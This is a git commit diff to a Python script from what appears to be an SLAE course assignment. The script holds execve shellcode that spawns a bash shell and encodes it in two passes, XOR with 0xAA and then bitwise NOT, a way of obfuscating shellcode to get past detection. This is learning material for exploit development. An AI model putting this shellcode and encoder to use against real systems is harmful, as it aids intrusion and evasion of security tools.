24840c21a3592834ed873b46995b8b5cd9320dfe
RomainLanglois <romain.langlois@viacesi.fr>
2020-01-25 21:01:13 +0100

    Update encoder.py file

--- SLAE/assignment4/encoder.py
+++ SLAE/assignment4/encoder.py
@@ -1,17 +1,23 @@
 #!/usr/bin/python3
 # Python XOR and NOT bits encoders
 
+# The shellcode used is a basic systemcall to execve
 shellcode = b"\x31\xdb\x53\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
 encoded_shellcode = ""
 
 print('Shellcode len: {}'.format(len(shellcode)))
 print('Encoded shellcode ...')
 
+# Encode the shellcode in two steps:
+# First, use a XOR encoder
+# Then, use a NOT encoder
 for x in bytearray(shellcode):
-	# 0xAA: Byte used to encode the shellcode using the AND operator
-	#y = x ^ 0xAA
-	# NOT encoder
-	y = ~x
+	# XOR encoder part
+	# 0xAA is the Byte used to encode
+	y = x ^ 0xAA
+
+	# NOT encoder part
+	y = ~y
 	encoded_shellcode += '{},'.format(hex(y & 0xFF))
 
 # Remove minus sign created by the NOT encoder
